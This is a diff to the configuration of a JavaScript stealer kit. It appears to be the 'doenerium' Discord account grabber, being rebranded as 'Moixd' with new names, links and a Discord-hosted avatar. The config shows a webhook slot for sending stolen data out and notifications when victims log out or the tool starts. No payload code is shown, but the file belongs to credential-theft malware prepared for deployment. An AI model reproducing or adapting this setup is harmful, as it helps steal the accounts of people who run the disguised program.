@@ -11,7 +11,7 @@ const fs = require("fs");
 // Initialization
 
 var config = {
-    brand: "doenerium",
+    brand: "Moixd",
 
     webhook: "REPLACE_ME",
 
@@ -20,16 +20,16 @@ var config = {
 
     notify_on_logout: true,
     notify_on_initialization: true,
-    ping: [true, "@doener"],
+    ping: [true, "@here"],
 
     embed: {
-        username: "doenerium | t.me/doenerium",
+        username: "Moixd",
         footer: {
-            text: `doenerium | t.me/doenerium`,
-            icon_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless",
+            text: `Moixd`,
+            icon_url: "https://media.discordapp.net/attachments/1017255584527032412/1152906144382197810/loli_pfp_anime__by_crystalwolfink_ddluws0-fullview.png?width=419&height=419",
         },
-        href: "https://t.me/doenerium",
-        avatar_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless"
+        href: "Moixd",
+        avatar_url: "https://media.discordapp.net/attachments/1017255584527032412/1152906144382197810/loli_pfp_anime__by_crystalwolfink_ddluws0-fullview.png?width=419&height=419"
     },
 
     badges: {
